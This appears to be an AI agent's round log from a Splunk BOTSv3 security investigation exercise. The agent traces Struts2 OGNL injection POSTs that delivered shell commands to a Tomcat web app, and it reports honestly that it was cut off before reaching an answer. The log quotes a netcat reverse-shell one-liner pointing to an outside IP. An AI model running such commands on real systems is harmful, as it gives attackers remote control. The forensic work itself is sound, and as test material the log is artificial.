# s2 - Q328 - Round 2
_stamped by runner: rounds_remaining=6 novel_spl=5_
**Scope:** index=botsv3 | sourcetype=stream:http (source=stream:http) | fields: form_data, uri_path, src_ip, dest_ip, _raw
**Insight:** NOT_FOUND
**Candidate:** none   **Confidence:** 20

## Prior rounds
- R1: "colonel" lead dead — 0 hits index-wide keyword search and in bash_history, linux_audit, ps, lsof, linux_secure; bash_history only covers klagerfield/ec2-user (no tomcat8 history).

## This round
### What I ran
- stream:http / linux_audit / linux_secure searches for "tomcat8" -> 0 rows each
- sample_events out-3, localhost-5 -> Tomcat/Struts error logs for /frothlyinventory app (the exploited web app)
- sample_events history-2 -> "apt-get install netcat" 2018-08-20 11:26:16 (attacker prep)
- stream:http search gcc OR chmod OR "/tmp/" -> 21 events; read 10 raw
- stream:http saveGangster | stats count by uri_path, src_ip -> 17 POSTs from 192.168.8.103

### What it means
Found the command-delivery channel: 17 Struts2 OGNL injection POSTs to /frothlyinventory/integration/saveGangster.action on 192.168.9.30:8080, each carrying a shell command in form_data (#cmd='...') executed via java.lang.ProcessBuilder — i.e. as the Tomcat service account. Payload 1 of 17 read: reverse shell `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe`. The escalation helper's compile/run command — and possibly its echoed source — should be among the 16 unread payloads. I have not yet identified the file, so no line 2 exists yet. The other 9 /tmp/ hits were unrelated IoT exploit-kit scanning against 172.16.0.x hosts.

## Ruled out
- IoT-scanner /tmp/ traffic (qtx.mips, dlink, xoxo) - 400/404 noise against 172.16.0.x, not the Struts app
- linux_audit, linux_secure, stream:http as tomcat8-name carriers - 0 hits for "tomcat8"
- out-3, localhost-5 - Tomcat/Struts exception logs, no command text
- Literal "colonel" name - refuted per SH q2; index-wide keyword search 0 events

_Iteration cap reached: 10/10 iterations used this round — cut off, not finished._

_Premise updates refused by the runner:_
- coverage premise not filed: you already have an open coverage premise p1 - amend or settle that one. The text you sent was discarded: "The tomcat8-to-root escalation commands on the exploited web host are delivered "
- selection premise not filed: you already have an open selection premise p2 - amend or settle that one. The text you sent was discarded: "The exploited Struts2/frothlyinventory host receiving the saveGangster POSTs (19"
- p1 stays UNVERIFIED: its quote is in no result you ran - copy the query output that shows it word for word
- p2 stays UNVERIFIED: its quote is in no result you ran - copy the query output that shows it word for word
